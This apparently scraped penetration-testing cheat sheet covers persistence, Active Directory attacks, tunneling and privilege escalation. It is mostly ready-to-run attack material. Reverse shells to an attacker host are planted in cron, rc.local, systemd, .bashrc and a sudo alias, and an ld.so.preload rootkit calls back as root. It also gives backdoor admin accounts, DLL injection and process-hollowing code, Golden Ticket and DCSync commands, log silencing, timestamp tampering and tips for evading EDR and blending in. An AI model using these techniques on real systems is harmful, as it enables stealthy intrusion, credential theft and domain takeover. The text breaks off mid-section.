# SSH key backdoor (survives reboots, looks legitimate)
echo '<your-public-key>' >> /root/.ssh/authorized_keys

# Cron job (execute every minute as root)
echo '* * * * * root bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1' >> /etc/crontab

# SUID shell (instant root on return)
cp /bin/bash /tmp/.bash && chmod +s /tmp/.bash
# Connect back: /tmp/.bash -p

See Linux Persistence for additional techniques including init scripts and library preloading.

docs.title: 3. Windows Persistence
docs.text:
# Registry Run key (executes on user login)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Temp\shell.exe"

# Scheduled task (executes on reboot)
schtasks /create /tn "WindowsUpdate" /tr "C:\Temp\shell.exe" /sc onstart /ru SYSTEM

# Add local admin account
net user backdoor P@ssw0rd123 /add
net localgroup Administrators backdoor /add

See Windows Persistence, Registry & Scheduled Tasks, and DLL Injection & Services.

docs.title: 4. Active Directory Persistence
docs.text:
Domain-level persistence survives local remediation — the account or ticket remains valid even after the initially compromised host is wiped.

# Golden Ticket — valid for 10 years by default
mimikatz # lsadump::lsa /patch         # dump krbtgt hash
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:<sid> /krbtgt:<hash> /ptt

See Active Directory Persistence for Golden Ticket and Shadow Copy techniques.

docs.title: 5. Backdoor Remote Access
docs.text:
A dedicated backdoor channel is useful when primary access (SSH, WinRM) gets blocked or credentials are rotated.

# SSH authorized_keys (Linux)
mkdir -p /root/.ssh && echo '<public-key>' >> /root/.ssh/authorized_keys

# WinRM backdoor user (Windows)
net user backdoor P@ssw0rd123 /add
net localgroup "Remote Management Users" backdoor /add

See Backdoor SSH & WinRM for setup and cleanup steps.

docs.title: Backdoor: SSH & WinRM
docs.text:
Tip

For SSH backdoor, add your public key to ~/.ssh/authorized_keys (or /root/.ssh/authorized_keys). No password needed and it survives password changes. For WinRM, enable it with Enable-PSRemoting -Force and add your user to the Remote Management Users group.

docs.title: Add Attacker SSH Key
docs.text: echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys

docs.title: Persistent Reverse Shell via rc.local
docs.text: echo "nohup bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1 &" >> /etc/rc.local

docs.title: Modify SSH Config
docs.text:
Loud

Enabling PermitRootLogin yes and silencing SSH logs is a highly suspicious change to /etc/ssh/sshd_config — any file-integrity monitoring or config-management tool (Puppet, Ansible, Chef) will flag or revert it on its next run. Prefer authorized_keys with from= restriction where possible.

sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config
echo "LogLevel QUIET" >> /etc/ssh/sshd_config
systemctl restart ssh

docs.title: Enable WinRM
docs.text:
winrm quickconfig
winrm set winrm/config/service @{AllowUnencrypted="true"}
winrm set winrm/config/service/auth @{Basic="true"}

docs.title: Create Backdoor User
docs.text:
net user backdoor P@ssw0rd /add
net localgroup Administrators backdoor /add

docs.title: Connect with Evil-WinRM
docs.text: evil-winrm -i 10.10.10.10 -u backdoor -p P@ssw0rd

docs.title: Scheduled Task Persistence
docs.text: schtasks /create /sc minute /mo 5 /tn "WinRM_Backdoor" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\backdoor.ps1"

docs.title: Registry-Based Persistence
docs.text: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WinRM_Backdoor" /t REG_SZ /d "powershell -ExecutionPolicy Bypass -File C:\backdoor.ps1" /f

docs.title: DLL Injection & Malicious Services
docs.text:
Watch out

Malicious services and DLL injection are heavily signatured by modern EDR. In real engagements, prefer LOLBin-based persistence (scheduled tasks, registry run keys, COM hijacking) over dropping new binaries.

docs.title: Classic DLL Injection
docs.text:
#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));
    if (!hProcess) {
        printf("Failed to open process\n");
        return 1;
    }

    void* pDllPath = VirtualAllocEx(hProcess, NULL, strlen(argv[2]) + 1, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProcess, pDllPath, argv[2], strlen(argv[2]) + 1, NULL);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pDllPath, 0, NULL);
    if (!hThread) {
        printf("Failed to create remote thread\n");
        return 1;
    }

    CloseHandle(hProcess);
    CloseHandle(hThread);
    return 0;
}

docs.title: Reflective DLL Injection
docs.text:
Loads a DLL directly into memory without writing to disk:

Invoke-ReflectivePEInjection -PEPath C:\payload.dll -ProcessID 1234

docs.title: Process Hollowing
docs.text:
#include <windows.h>

int main() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcess("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    void* pRemoteMemory = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, pRemoteMemory, payload, payloadSize, NULL);

    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}

docs.title: Create a Backdoor Service
docs.text:
sc create BackdoorService binPath= "C:\Windows\System32\cmd.exe /c C:\payload.exe" start= auto
sc start BackdoorService

docs.title: Modify an Existing Service
docs.text:
sc config VulnerableService binPath= "C:\malicious.exe"
sc start VulnerableService

docs.title: DLL Hijacking via Service
docs.text:
1. Identify DLL loaded from unprotected path:

    listdlls -accepteula | findstr "C:\Program Files\VulnerableApp\"

  2. Replace with malicious DLL:

    move C:\backdoor.dll "C:\Program Files\VulnerableApp\legit.dll"

docs.title: Scheduled Task Service Execution
docs.text: schtasks /create /tn "WinPersistence" /tr "C:\malicious.exe" /sc onlogon /ru SYSTEM

docs.title: Linux Persistence
docs.text:
Stealthy vs quick

Cron (* * * * * /tmp/.x) is quick but obvious in crontab -l. For stealth, add to /etc/cron.d/ with a blending name (logrotate-extra). SSH authorized_keys is most reliable — survives reboots and doesn't show in process listings.

docs.title: Identify Writable Cron Jobs
docs.text:
ls -lah /etc/cron*
cat /etc/crontab
crontab -l
grep "CRON" /var/log/syslog

docs.title: Inject Reverse Shell into Writable Cron Job
docs.text:
echo "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" >> /home/user/backup.sh
nc -lvnp 4444

docs.title: SSH Key Persistence
docs.text:
ssh-keygen -t rsa -b 4096 -f ~/.ssh/persistent_key
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
ssh -i persistent_key <user>@10.10.10.10

docs.title: Systemd Service Persistence
docs.text:
1. Create a service file at /etc/systemd/system/persistence.service:

    [Unit]
Description=Persistence Service
After=multi-user.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target

  2. Enable and start:

    systemctl enable persistence.service
systemctl start persistence.service

docs.title: User-Level systemd Services (No Root Required)
docs.text:
mkdir -p ~/.config/systemd/user
cat > ~/.config/systemd/user/update-check.service <<'EOF'
[Unit]
Description=Update checker

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'
Restart=always

[Install]
WantedBy=default.target
EOF

systemctl --user enable --now update-check.service
# Survives logout if linger is enabled:
loginctl enable-linger $USER

docs.title: /etc/ld.so.preload
docs.text:
Every dynamically-linked binary (most of the system) loads libraries listed here at startup. Inject a shared object that runs on every command:

cat > /tmp/rk.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
__attribute__((constructor)) void init(){
    if(getuid()==0) system("bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1 &'");
}
EOF
gcc -fPIC -shared -nostartfiles /tmp/rk.c -o /lib/x86_64-linux-gnu/libudev.so.9
echo /lib/x86_64-linux-gnu/libudev.so.9 > /etc/ld.so.preload

Watch out

ld.so.preload loads into every process — a broken library or crashing payload will brick the system. Test the .so in isolation first, and keep the payload wrapped in a UID check and a background fork to avoid stalling normal commands.

docs.title: SSH authorized_keys With from= Restriction
docs.text:
Lock the backdoor to your attacker IP so it blends better and doesn't grant random scanners access:

echo 'from="203.0.113.5" ssh-rsa AAAA...' >> /root/.ssh/authorized_keys

Also consider command=:

echo 'command="/bin/bash",from="203.0.113.5" ssh-rsa AAAA...' >> /root/.ssh/authorized_keys

docs.title: Shell RC File Hijack
docs.text:
# Runs every time the user starts an interactive shell
echo 'bash -c "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" &' >> /root/.bashrc

Lower-footprint alternative — only fires when a specific command is run:

echo 'alias sudo="bash -c \"bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1\" &; /usr/bin/sudo"' >> /root/.bashrc

docs.title: Registry & Scheduled Task Persistence
docs.text:
Tip

Scheduled tasks with SYSTEM privileges are powerful but logged. Use schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c ..." /sc onlogon /ru SYSTEM and name the task to blend in with legitimate tasks.

docs.title: Common Persistence Keys
docs.text:
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell

docs.title: Add Payload to Run Key
docs.text: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f

docs.title: Hide Payload via mscfile Handler
docs.text: reg add "HKCU\Software\Classes\mscfile\shell\open\command" /t REG_SZ /d "C:\Users\Public\reverse_shell.exe" /f

docs.title: Modify Userinit
docs.text: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\System32\userinit.exe, C:\backdoor.exe" /f

docs.title: Modify Shell
docs.text: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, C:\malicious.exe" /f

docs.title: Create Malicious Task
docs.text: schtasks /create /tn "WindowsUpdate" /tr "C:\Users\Public\backdoor.exe" /sc ONLOGON /ru SYSTEM

docs.title: List Tasks
docs.text: schtasks /query /fo LIST /v

docs.title: Modify Existing Task
docs.text: schtasks /change /tn "BackupTask" /tr "C:\Users\Public\reverse_shell.exe"

docs.title: Run Task Immediately
docs.text: schtasks /run /tn "WindowsUpdate"

docs.title: Delete Task
docs.text: schtasks /delete /tn "WindowsUpdate" /f

docs.title: Startup Folder Persistence
docs.text:
echo %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
copy backdoor.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

docs.title: Timestamp Manipulation (Evasion)
docs.text: powershell -c "$(Get-Item C:\Users\Public\malware.exe).LastWriteTime=('01/01/2021 12:00:00 PM')"

docs.title: Windows Persistence
docs.text:
Tip

Registry Run keys (HKCU\Software\Microsoft\Windows\CurrentVersion\Run) persist across reboots and are user-writable without admin. For admin persistence, scheduled tasks with SYSTEM privileges are more reliable than services.

docs.title: Enumerate Auto-Run Keys
docs.text:
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

docs.title: Create a Registry Key for Persistence
docs.text: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyBackdoor /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f

docs.title: List All Scheduled Tasks
docs.text: schtasks /query /fo LIST /v

docs.title: Create a Malicious Scheduled Task
docs.text: schtasks /create /sc minute /mo 1 /tn "UpdateCheck" /tr "C:\Users\Public\malicious.exe" /F

docs.title: Hijack an Existing Task Binary
docs.text:
icacls C:\Path\To\TaskBinary.exe /grant Everyone:F
copy malicious.exe C:\Path\To\TaskBinary.exe

docs.title: Trigger Task Immediately
docs.text: schtasks /run /tn "UpdateCheck"

docs.title: Port Forwarding & Tunneling
docs.text: Port forwarding and tunneling extend your network reach through a compromised host — letting you interact with internal services that aren't directly accessible from your attacker machine. The right tool depends on what's available on the pivot host and what you need to reach.

docs.title: 1. Identify What You Need to Reach
docs.text:
Before setting up a tunnel, be clear about the goal:

  • A single internal port (e.g., RDP on an internal host) → local port forward
  • A full internal subnet (e.g., domain controller, internal web apps) → full proxy/pivot
  • Reverse access through a restrictive firewall → reverse tunnel

docs.title: 2. Choose the Right Tool
docs.text: Situation Best tool SSH access to the pivot host SSH -L (local) or -R (remote) — no extra tools Need to proxy an entire subnet Ligolo-ng — full Layer 3 routing Quick single-port tunnel, no SSH Chisel — lightweight, runs on any OS One-shot relay without installing anything socat or netcat Metasploit session active route add + proxychains

docs.title: 3. SSH Port Forwarding
docs.text:
Local forward — access a remote port locally:

# Access internal RDP (3389) via localhost:13389
ssh -L 13389:10.10.10.20:3389 user@10.10.10.10

Remote forward — expose your local port through the target (reverse tunnel):

ssh -R 4444:localhost:4444 user@10.10.10.10

Dynamic SOCKS proxy — route any tool through the pivot:

ssh -D 1080 user@10.10.10.10
# then: proxychains nmap -sT -Pn 10.10.20.0/24

docs.title: 4. Ligolo-ng (Full Subnet Pivoting)
docs.text:
Best option when you need to reach an entire internal network segment. Sets up a proper Layer 3 tunnel — tools don't need proxychains.

# Attacker: start the proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# Target: run the agent
./agent -connect <attacker-ip>:11601 -ignore-cert

# Attacker: add route to internal subnet
ip route add 10.10.20.0/24 dev ligolo

See Ligolo-ng & Chisel for full setup and multi-hop pivoting.

docs.title: 5. Chisel (Quick Reverse Tunnel)
docs.text:
Lightweight and works without SSH. Good for a fast single-port forward through a firewall.

# Attacker: start server
chisel server -p 8080 --reverse

# Target: connect and forward a port
chisel client <attacker-ip>:8080 R:3389:10.10.10.20:3389

docs.title: 6. Route Traffic Through the Tunnel
docs.text:
Once a SOCKS proxy or Ligolo tunnel is active, route tools through it:

# proxychains (for tools that don't support SOCKS natively)
proxychains nmap -sT -Pn -p 80,443,445 10.10.20.10

# Impacket tools support --proxy natively
impacket-secretsdump -proxy socks5://127.0.0.1:1080 CORP/admin:'pass'@10.10.20.10

Real-world

Ligolo-ng is the cleanest option for HTB Pro Labs and real internal engagements — once the route is added, every tool works normally without proxychains wrapping. Set it up first before spending time configuring individual SOCKS proxies.

docs.title: Ligolo-ng & Chisel
docs.text:
Tool Best for Agent required on target Ligolo-ng Full network pivot with routing table Yes (agent binary) Chisel Single port forward, quick setup Yes (chisel binary) SSH -L / -R When SSH is available No socat Simple one-shot relay Yes (socat binary) sshuttle Full VPN over SSH from attacker machine No (attacker-side only)

Tip

Ligolo-ng is the fastest way to pivot to an internal network — once the agent connects back, add a route on your attacker machine and the entire subnet is accessible. No need for individual port forwards.

docs.title: 1. Extract Binaries
docs.text:
tar -xzvf ligolo-ng_agent_VERSION_HARDWARE.tar.gz
tar -xzvf ligolo-ng_proxy_VERSION_HARDWARE.tar.gz

docs.title: 2. Configure TUN Interface (Attacker)
docs.text:
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

docs.title: 3. Start Proxy (Attacker)
docs.text: ./proxy -laddr 0.0.0.0:9001 -selfcert

docs.title: 4. Start Agent (Target)
docs.text: .\agent.exe -connect <attacker-ip>:9001 -ignore-cert

docs.title: 5. Establish the Tunnel
docs.text:
ligolo-ng >> session
ligolo-ng >> ifconfig
ligolo-ng >> start

docs.title: 6. Add Route to Internal Network
docs.text: sudo ip route add 172.16.4.0/24 dev ligolo

docs.title: Adding Listeners
docs.text:
To catch callbacks from internal hosts through the tunnel:

listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443

Example scenario — MS01 (192.168.149.150) is compromised and bridges to MS02 (10.10.110.45) and DC01 (10.10.110.44). After routing the internal subnet through Ligolo-ng, set up a listener on the agent to forward reverse shell connections from MS02 back to your Kali netcat listener.

docs.title: 1. Extract Binary
docs.text:
gunzip chisel_linux_amd64.gz
chmod +x chisel_linux_amd64

docs.title: 2. Start Server (Attacker)
docs.text: chisel server -p 8080 --reverse

docs.title: 3. Start Client (Target) — Single Port Forward
docs.text: .\chisel.exe client <attacker-ip>:8080 R:3306:127.0.0.1:3306

docs.title: 4. Connect to Forwarded Service
docs.text: mysql -h 127.0.0.1 -P 3306 -u root -p

docs.title: SOCKS5 Proxy Mode
docs.text:
.\chisel.exe client <attacker-ip>:8080 R:socks

Add to /etc/proxychains4.conf:

socks5 127.0.0.1 1080

Route tools through the tunnel:

proxychains nmap -sT -p445 10.4.50.215
proxychains smbclient -L //10.4.50.215/ -U <user>

docs.title: Port Forwarding
docs.text:
Tip

SSH local port forward: ssh -L 8080:internal-host:80 pivot@10.10.10.10 — makes internal-host:80 accessible at localhost:8080 on your machine. Remote forward: ssh -R 4444:localhost:4444 pivot@10.10.10.10 — routes target's port back to you.

docs.title: Socat Port Forward
docs.text:
Forward traffic through a compromised pivot host to an internal target:

# On the compromised pivot (CONFLUENCE01)
socat TCP-LISTEN:2222,fork TCP:10.4.189.215:22

# On attacker (Kali) — connects through pivot to internal SSH
ssh database_admin@192.168.189.63 -p2222

docs.title: SSH Local Port Forwarding
docs.text:
ssh -L 8080:10.4.50.215:80 <user>@192.168.1.100

Access the internal web server at http://localhost:8080/.

docs.title: SSH Dynamic Port Forwarding (SOCKS Proxy)
docs.text:
ssh -D 1080 <user>@10.10.10.10

Add to /etc/proxychains4.conf:

socks5 127.0.0.1 1080

Route tools through the proxy:

proxychains nmap -sT -p445 10.10.10.20
proxychains smbclient -L //10.10.10.20/ -U <user>

docs.title: sshuttle (VPN-over-SSH)
docs.text:
No agent needed on the target — only SSH access. sshuttle transparently tunnels traffic for specified subnets through the SSH session. Tools run natively (no proxychains).

sshuttle -r <user>@10.10.10.10 10.10.20.0/24

# Multiple subnets + include DNS
sshuttle -r <user>@10.10.10.10 10.10.20.0/24 10.10.30.0/24 --dns

Real-world

sshuttle is the fastest setup when you have SSH — no need to drop binaries on the pivot. Uses iptables on attacker side to redirect traffic, so expect sudo prompt. Works great for quick internal network access on engagements where you've obtained SSH creds.

docs.title: Privilege Escalation
docs.text:
The first thing to do after landing a shell is enumerate — not guess. Automated tools like linpeas and winpeas surface most vectors quickly, but knowing what to look for means you can act on the output rather than just reading it.

Section Common vectors Linux sudo misconfig, SUID binaries, cron jobs, capabilities, credential files, kernel exploits Windows SeImpersonatePrivilege, weak service permissions, credential dumping, AlwaysInstallElevated Active Directory Kerberoasting, AS-REP roasting, ACL abuse, DCSync, ticket attacks

docs.title: 1. Situational Awareness First
docs.text:
Before running any tooling, confirm who you are, where you are, and what access you already have. Thirty seconds of manual orientation often reveals the path without needing linpeas/winpeas at all.

id && sudo -l                          # Linux
whoami /priv && whoami /groups          # Windows

See Situational Awareness for the full first-look command set across Linux, Windows, and AD.

docs.title: 2. Run an Automated Enumeration Script
docs.text:
Let the tool do the broad sweep next, then dig into what it flags.

Linux:

curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

Windows:

iwr -uri http://<attacker-ip>/winPEASx64.exe -OutFile C:\Temp\winpeas.exe; .\winpeas.exe

Real-world

Serve tools from a Python HTTP server on your attacker machine (python3 -m http.server 80) rather than transferring files manually. Faster and leaves less on disk.

docs.title: 3. Linux — Work the Checklist
docs.text:
Check in this order — each step is faster than the one before it:

sudo -l                                        # sudo permissions (most common path)
find / -perm -4000 -type f 2>/dev/null         # SUID binaries
cat /etc/crontab; ls -lah /etc/cron.*          # cron jobs
getcap -r / 2>/dev/null                        # Linux capabilities
find / -name "*.conf" -readable 2>/dev/null    # readable config files with creds
uname -r                                       # kernel version for exploit search

See Local Enumeration, Cron & SUID, Capabilities & LD_PRELOAD, and Credential Hunting.

docs.title: 4. Windows — Work the Checklist
docs.text:
whoami /priv                          # token privileges (SeImpersonate is game over)
whoami /groups                        # group memberships
Get-LocalGroupMember Administrators   # who else has admin
Get-Service | Where-Object {$_.Status -eq "Running"}  # running services
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

SeImpersonatePrivilege → run PrintSpoofer or GodPotato depending on OS version.

See Privilege Abuse, Service Exploitation, and Credential Dumping.

docs.title: 5. Active Directory — Map the Path First
docs.text:
Don't guess at AD attacks — collect BloodHound data first and let it show you the shortest path to Domain Admin.

bloodhound-python -c all -d example.com -u <user> -p '<pass>' -ns 10.10.10.10 --zip

Then in BloodHound, run: Shortest Paths to Domain Admins.

Common attack chains:

Entry point Path Domain user with no special perms Check for Kerberoastable SPNs or AS-REP roastable accounts GenericWrite on a user Force password reset or targeted Kerberoasting GenericAll on a group Add yourself to privileged group Replication rights DCSync → dump all hashes DA / EA Golden ticket for persistent access

See Domain Enumeration, Kerberoasting, ACL Abuse, and DCSync.

Watch out

DCSync (Event ID 4662) and Kerberoasting (Event ID 4769) are logged on the DC. On monitored environments, do it once, get what you need, and stop.

docs.title: Situational Awareness
docs.text:
Tip

Before running any priv-esc tooling, answer three questions: who am I, where am I, and who else is here? A minute of manual orientation prevents wasted scans and tells you what kind of escalation path is even possible.

The commands below are the first thing to run on any new shell — they're intentionally manual so you understand the environment before firing off linpeas or winpeas. See Linux Local Enumeration and Windows Local Enumeration for automated follow-up.

docs.title: Who Am I
docs.text:
id
whoami
groups
sudo -l                                 # what can I run as root?

docs.title: Where Am I
docs.text:
hostname
uname -a
cat /etc/os-release
ip a
ss -tulnp                               # listening services

docs.title: Who Else Is Here
docs.text:
cat /etc/passwd | grep -v nologin       # accounts with shells
who
w                                       # currently logged-in users
last -a | head                          # recent logins
getent passwd                           # includes AD/LDAP users when nsswitch is configured

docs.title: What's Running
docs.text:
ps auxf
systemctl list-units --type=service --state=running
crontab -l                              # my cron jobs
cat /etc/crontab                        # system cron
ls -la /etc/cron.*

docs.title: Who Am I
docs.text:
whoami
whoami /all
whoami /priv
whoami /groups

docs.title: Where Am I
docs.text:
hostname
systeminfo
ipconfig /all
netstat -ano
echo %USERDOMAIN%
echo %LOGONSERVER%

docs.title: Who Else Is Here
docs.text:
net user
net localgroup
net localgroup Administrators
query user

docs.title: What's Running
docs.text:
tasklist /v
sc query state= all
schtasks /query /fo LIST /v
wmic product get name,version

PowerShell equivalents:

Get-Process
Get-Service | Where-Object {$_.Status -eq 'Running'}
Get-ScheduledTask | Where-Object State -eq Ready
Get-NetTCPConnection -State Listen

docs.title: Active Directory
docs.text:
Once you confirm you're domain-joined (via echo %USERDOMAIN% or (Get-WmiObject Win32_ComputerSystem).Domain), fall back to built-in net commands — no tools to upload, works from any user context:

net user /domain                        # all domain users
net user <username> /domain             # user details, group membership
net group /domain                       # domain groups
net group "Domain Admins" /domain       # DA membership
net group "Enterprise Admins" /domain
net accounts /domain                    # password policy, lockout threshold

PowerShell (ActiveDirectory module, if available):

Get-ADUser -Filter * -Properties LastLogonDate | Select Name,LastLogonDate
Get-ADUser -Identity <user> -Properties *
Get-ADGroupMember "Domain Admins"
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

For full AD enumeration without relying on the AD module, see Domain Enumeration and BloodHound.

Real-world

whoami /priv on Windows is the single most valuable command after landing a shell. SeImpersonatePrivilege, SeBackupPrivilege, SeAssignPrimaryToken, or SeLoadDriverPrivilege each map to a concrete local-to-SYSTEM path — check Privilege Abuse first before anything else.

docs.title: Active Directory Privilege Escalation
docs.text:
Attack paths for moving from a domain foothold to Domain Admin. Start with BloodHound to map the environment before attempting individual techniques.

Technique Entry Point ASREPRoasting No credentials required Kerberoasting Valid domain credentials ACL Abuse Misconfigured object permissions DCSync Replication rights on domain object Silver / Golden Tickets Service or krbtgt hash Persistence Post-DA access

docs.title: ACL Abuse
docs.text:
Tip

BloodHound is the authoritative source for ACL paths — it resolves nested group memberships and converts control rights (WriteDACL, GenericAll, GenericWrite, AddMember, ForceChangePassword, WriteOwner, AllExtendedRights) into actionable attack edges. Don't manually enumerate ACLs domain-wide; target specific objects after BloodHound points you at them.

docs.title: Enumerate ACLs (PowerView dev branch)
docs.text:
Import-Module .\PowerView.ps1

# All ACLs on a target
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | FT SecurityIdentifier,ActiveDirectoryRights,ObjectAceType

# Only interesting rights
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|AllExtendedRights' }

# SID → name
ConvertFrom-SID S-1-5-21-1987370270-658905905-1781884369-1104

# What does <user> have rights over?
Get-DomainObjectAcl -ResolveGUIDs -Identity * | ? { $_.SecurityIdentifier -eq (ConvertTo-SID <user>) }

docs.title: Force a password reset
docs.text:
$SecPass = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity target_user -AccountPassword $SecPass

From Linux:

net rpc password target_user 'NewPass123!' -U 'example.com/<attacker>%<pass>' -S 10.10.10.10

docs.title: Targeted Kerberoasting (GenericWrite only)
docs.text:
If you can't reset the password, set an SPN on the account, request its TGS, crack it:

Set-DomainObject -Identity target_user -Set @{serviceprincipalname='fake/spn'}

impacket-GetUserSPNs example.com/<attacker>:<pass> -dc-ip 10.10.10.10 -request -outputfile tgs.hash
hashcat -m 13100 tgs.hash rockyou.txt

Then clear the SPN to clean up:

Set-DomainObject -Identity target_user -Clear serviceprincipalname

docs.title: GenericAll on a Group
docs.text:
Add yourself as a member:

Add-DomainGroupMember -Identity "Target Group" -Members <attacker>

From Linux:

net rpc group addmem "Target Group" <attacker> -U 'example.com/<user>%<pass>' -S 10.10.10.10

docs.title: WriteDACL on the Domain — Grant DCSync
docs.text:
With WriteDACL on the root domain object, grant yourself replication rights:

Add-DomainObjectAcl -TargetIdentity "DC=example,DC=com" -PrincipalIdentity <attacker> -Rights DCSync

Then run DCSync — see DCSync.

From Linux (dacledit.py from Impacket, recent versions):

dacledit.py -action write -rights DCSync -principal <attacker> -target-dn 'DC=example,DC=com' example.com/<user>:'<pass>' -dc-ip 10.10.10.10

docs.title: WriteOwner on an Object
docs.text:
Take ownership first, then grant yourself full control:

Set-DomainObjectOwner -Identity target_user -OwnerIdentity <attacker>
Add-DomainObjectAcl -TargetIdentity target_user -PrincipalIdentity <attacker> -Rights All

From Linux:

owneredit.py -action write -new-owner <attacker> -target target_user example.com/<user>:'<pass>' -dc-ip 10.10.10.10
dacledit.py -action write -rights FullControl -principal <attacker> -target target_user example.com/<user>:'<pass>' -dc-ip 10.10.10.10

docs.title: ForceChangePassword Extended Right
docs.text:
A targeted form of password reset — doesn't require knowing the old password.

Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

docs.title: ReadGMSAPassword — Retrieve gMSA Password
docs.text:
Group Managed Service Accounts (gMSA) store their password in a special LDAP attribute. If your user or a group you're in has read access, retrieve and use the NTLM hash:

nxc ldap 10.10.10.10 -u <user> -p '<pass>' --gmsa

# Or with gMSADumper
gMSADumper.py -u <user> -p '<pass>' -d example.com

The returned NTLM hash can be used directly for pass-the-hash against services the gMSA controls.

docs.title: Shadow Credentials (msDS-KeyCredentialLink)
docs.text: Modern alternative to password reset — works when you have GenericWrite/GenericAll on a user or computer and the domain has Kerberos PKI enabled (any DC running Windows Server 2016+ that supports PKINIT). You add a certificate to msDS-KeyCredentialLink, then use it to request a TGT.

docs.title: With pywhisker (Linux)
docs.text:
pywhisker.py -d example.com -u <attacker> -p '<pass>' --target target_user --action add

This drops a .pfx file. Use it with PKINITtools:

gettgtpkinit.py -cert-pfx target_user.pfx -pfx-pass '<pfx-password>' example.com/target_user target_user.ccache
export KRB5CCNAME=target_user.ccache

Then use the TGT to get the NT hash via U2U:

getnthash.py -key <as-rep-key> example.com/target_user

docs.title: With Whisker (Windows)
docs.text:
.\Whisker.exe add /target:target_user
# Follow Rubeus asktgt command emitted by Whisker

When to use Shadow Credentials over password reset

Resetting a user's password locks them out and gets noticed immediately. Shadow Credentials add a cert without changing the password — the user keeps working, you keep access. Much quieter for real engagements.

docs.title: AddSelf — Add Yourself to a Group
docs.text:
If you have Self + Member write rights on a group, add yourself without needing GenericAll:

Add-DomainGroupMember -Identity "Target Group" -Members <attacker>

docs.title: AS-REP Roasting
docs.text:
Tip

Always check for AS-REP roastable accounts early — it requires no credentials. impacket-GetNPUsers example.com/ -dc-ip 10.10.10.10 -request enumerates from Linux with no auth if null sessions work.

From the lab

AS-REP roasting often finds accounts misconfigured during provisioning scripts. Check service accounts and CI/CD runner accounts first — pre-auth is commonly disabled for convenience.

docs.title: Preconditions
docs.text:
• Target user must have "Do not require Kerberos preauthentication" set
  • You need a valid username and access to UDP/TCP 88 on the DC

docs.title: Option A: PowerView
docs.text: Get-DomainUser -PreauthNotRequired

docs.title: Option B: BloodHound Query
docs.text: MATCH (u:User) WHERE u.dontreqpreauth=true RETURN u.name

docs.title: Step 2: Extract Hashes with Impacket
docs.text:
Unauthenticated:

python3 GetNPUsers.py htb.local/ -usersfile users.txt -dc-ip 10.10.110.146 -format hashcat -outputfile asrep.hash

Authenticated:

